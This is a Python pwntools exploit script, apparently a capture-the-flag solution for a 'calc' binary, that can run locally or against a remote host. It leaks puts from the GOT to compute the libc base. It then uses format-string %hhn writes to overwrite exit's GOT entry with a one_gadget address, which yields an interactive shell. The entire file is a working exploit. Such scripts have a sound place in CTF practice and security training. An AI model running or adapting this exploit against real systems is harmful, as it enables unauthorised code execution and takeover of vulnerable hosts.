from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./calc")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./calc")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./calc")
	

def calcu(buf,conti = True):
	p.sendlineafter("Your input:\n",buf)

def conti(conti = True):
	if conti:
		p.sendafter("Y:N\n","Y")
	else:
		p.sendafter("Y:N\n","N")
	
def debugf():
	gdb.attach(p,"b *0x400920\nb printf")

def sendpayload(p1,write_addr):
	base = 0x6020c0
	target = 0x6021c0
	number = (target-base)/8
	payload = "-" * number
	res = 0
	while p1[:8] != "":
		par1 = u64(p1[:8].ljust(8,"\x00"))
		payload += str(par1) + "+"
		res += par1
		p1 = p1[8:]
	payload += str(write_addr - res)
	calcu(payload)

def change_exit():
	one_gadget = libc.address + 0xf1147
	log.success("one_gadget:"+hex(one_gadget))
	exit_got = elf.got["exit"]
	#debugf()
	for i in range(8):
		number = (one_gadget >> (i*8)) & 0xff
		if number == 0:
			payload = "%1$hhn"
		else:
			payload = "%{number}c%1$hhn".format(number=number)
		#payload = "%1c%1$n"
		sendpayload(payload,exit_got+i)
		if i != 7:
			conti()
		else:
			conti(False)

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
base = 0x6020c0
target = 0x6021c0
number = (target-base)/8
p1 = u64("%s".ljust(8,"\x00")) 
payload = "-"*number + str(p1) + "+" + str(elf.got["puts"]-p1)
calcu(payload)
#print p.recv(6)
puts_addr = u64(p.recvuntil("continue")[:6].ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
conti()
change_exit()
p.interactive()
